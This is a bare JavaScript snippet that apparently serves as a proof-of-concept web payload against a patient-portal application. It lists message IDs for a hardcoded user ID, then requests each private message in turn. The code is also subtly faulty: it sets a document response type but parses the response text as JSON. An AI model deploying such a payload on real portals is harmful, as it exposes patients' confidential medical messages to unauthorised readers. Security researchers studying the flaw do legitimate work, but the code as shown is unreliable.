var req = new XMLHttpRequest();
var req2 = new XMLHttpRequest();

req.onreadystatechange = function()
{
if (req.readyState == 4 && req.status == 200 )
  {
  reponse_obj = JSON.parse(req.responseText);
  for (var i = 0; i < reponse_obj.rows.length; i++) {
    var row = reponse_obj.rows[i];
    console.log(row.id);
    req2.open("GET", "https://appsecpatientportal.eclinicalweb.com/portal_trunk/jsp/jspnew/messages.jsp?box=2&msgid="+row.id, true);
    req2.send();
     }
   }
};

req.open("GET", "https://appsecpatientportal.eclinicalweb.com/portal_trunk/jsp/jspnew/messageJson.jsp?uid=9135&type=0&tab=3&rows=20&page=1");
req.responseType = "document";
req.send();
